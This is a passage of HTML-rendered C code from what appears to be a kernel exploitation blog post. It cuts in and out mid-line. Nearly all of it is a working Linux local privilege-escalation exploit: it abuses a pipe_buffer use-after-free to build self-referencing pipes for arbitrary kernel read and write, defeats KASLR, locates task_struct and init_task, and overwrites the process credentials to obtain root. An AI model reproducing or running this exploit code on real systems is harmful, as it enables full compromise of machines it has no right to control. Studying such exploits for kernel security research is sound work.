class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">           <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">           info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">        || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">    info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">        <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">            snd_orig_pid = nr;</span><br><span class="line">            snd_vicitm_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">                   snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>]= &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span></span><br><span class="line"><span class="comment"> * We need to build a circle there for continuously memory seeking:</span></span><br><span class="line"><span class="comment"> * - 2nd pipe to search</span></span><br><span class="line"><span class="comment"> * - 3rd pipe to change 4th pipe</span></span><br><span class="line"><span class="comment"> * - 4th pipe to change 2nd and 3rd pipe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_leaking_by_arbitrary_pipe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">    setup_evil_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">            kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">            kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">                   kernel_base, kernel_offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now seeking for the task_struct in kernel memory */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment">     * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">            current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">            page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                   (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                   page_offset_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] 